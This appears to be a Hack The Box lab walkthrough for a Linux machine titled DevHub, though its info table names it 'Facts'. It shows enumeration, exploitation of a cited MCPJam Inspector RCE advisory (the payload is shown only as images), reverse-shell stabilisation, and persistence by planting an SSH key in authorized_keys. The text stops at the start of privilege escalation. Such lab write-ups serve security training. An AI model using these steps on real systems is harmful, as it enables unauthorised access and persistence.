# Hack The Box — DevHub Walkthrough

## Machine Information
| Field | Value |
|------|------|
| Name | Facts |
| Platform | Hack The Box |
| OS | Linux |
| Difficulty | Medium |
| Release Date | 30th May, 2026 |

## Overview

DevHub is a Linux-based Hack The Box machine focused on web enumeration, internal service discovery, credential exposure, and privilege escalation through locally hosted development and operations services.  
  
The foothold involves identifying exposed web functionality and pivoting into internal services that are only accessible from the target host. Further enumeration reveals a Jupyter Lab instance and an internal operations MCP service, both of which play a key role in escalating privileges. The machine emphasizes careful process inspection, localhost service enumeration, SSH tunneling, API interaction, and abusing exposed administrative functionality.  

**Skills / Techniques**

- Web Enumeration
- Service Enumeration
- Localhost Service Discovery
- SSH Port Forwarding
- Jupyter Lab Token Abuse
- API Key Discovery
- Hidden API Endpoint Abuse
- Privilege Escalation
- Linux Post-Exploitation Enumeration

## Table of Contents

- Reconnaissance
- Enumeration
- Initial Access
- Internal Service Discovery
- SSH Tunneling
- Jupyter Lab Access
- Privilege Escalation
- Root Access
- Lessons Learned

## Recon
Initial information gathering and port scanning.
```
> nmap -sV -T4 -p- <IPADDRESS>  
### Findings:
- 22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
- 80/tcp   open  http    nginx 1.18.0 (Ubuntu)
- 6274/tcp open  unknown
```
<img src="images/nmap.png" width="500">     

## Enumeration
```
> ffuf -w '/path/to/wordlist/SecLists/Discovery/Web-Content/common.txt' -u 'http://devhub.htb/FUZZ' -ac
> ffuf -w '/path/to/wordlist/SecLists/Discovery/Web-Content/common.txt' -u 'http://devhub.htb:6274/FUZZ' -ac
> ffuf -w '/path/to/wordlist/SecLists/Discovery/DNS/subdomains-top1million-5000.txt' -u 'http://devhub.htb/' -H "Host: FUZZ.devhub.htb" -ac
[...]
```
No luck...

Let's check for MCPJam Vulnerabilities:    
  
<img src="images/MCPJam.png" width="1000">     

Nice, the version is vulnerable:  
https://github.com/advisories/GHSA-232v-j27c-5pp6  
https://medium.com/@iamkumarraj/exploiting-mcpjam-inspector-understanding-rce-via-api-mcp-connect-2f2791166d2a   

Open BurpSuite and dive the webapp. After MCP server creation we found the juicy POST request:  

<img src="images/addmcp.png" width="500">  
<img src="images/api_mcp_connect_vulnerable_normal.png" width="1000">  

## Exploitation
Now we can craft a malicious request and exploit the vulnerability.  
  
<img src="images/MCPJamRCE.png" width="1000">    

We have to be quick, the reverse shell is going to close any soon because of a timeout. Stabilize it.

```
> which python3
> /usr/bin/python3
> python3 -c 'import pty;pty.spawn("/bin/bash")'
```
  
If you wanna lose some time you can also get a full ssh: 

```
Attacker machine:
> ssh-keygen -t ed25519 -f devhub_mcpdev -N ''
> ls
  devhub_mcpdev  devhub_mcpdev.pub
> cat devhub_mcpdev.pub
  ssh-ed25519 AAAAC3Nz-MY_KEY-ElYICu6fq kali@kali

Target machine:
> mkdir -p ~/.ssh
> chmod 700 ~/.ssh
> echo 'ssh-ed25519 AAAAC3Nz-MY_KEY-ElYICu6fq kali@kali' >> ~/.ssh/authorized_keys
> chmod 600 ~/.ssh/authorized_keys

Attacker machine:
> chmod 600 devhub_mcpdev
> ssh -i devhub_mcpdev mcp-dev@devhub.htb
```

## Priviledge Escalation  
Let's run LinPeas.sh as always...  
we see lots of kernel exploits that <SPOILER> won't work because of this:  

```
> ls -la /etc/modprobe.d/
  total 52
  drwxr-xr-x   2 root root 4096 May 20 14:30 .
  drwxr-xr-x 106 root root 4096 May 26 09:06 ..
  -rw-r--r--   1 root root  154 Oct 16  2024 amd64-microcode-blacklist.conf
  -rw-r--r--   1 root root  325 Aug 17  2021 blacklist-ath_pci.conf
  -rw-r--r--   1 root root 1518 Aug 17  2021 blacklist.conf
  -rw-r--r--   1 root root  210 Aug 17  2021 blacklist-firewire.conf
  -rw-r--r--   1 root root  677 Aug 17  2021 blacklist-framebuffer.conf
  -rw-r--r--   1 root root  583 Aug 17  2021 blacklist-rare-network.conf
  -rw-r--r--   1 root root  264 Apr 30 12:32 **disable-algif_aead.conf**
  -rw-r--r--   1 root root   73 May 20 14:30 **disable-dirtyfrag.conf**
  -rw-r--r--   1 root root  154 Oct 28  2025 intel-microcode-blacklist.conf
  -rw-r--r--   1 root root  347 Aug 17  2021 iwlwifi.conf
  -rw-r--r--   1 root root  379 Apr 11  2023 mdadm.conf
```  



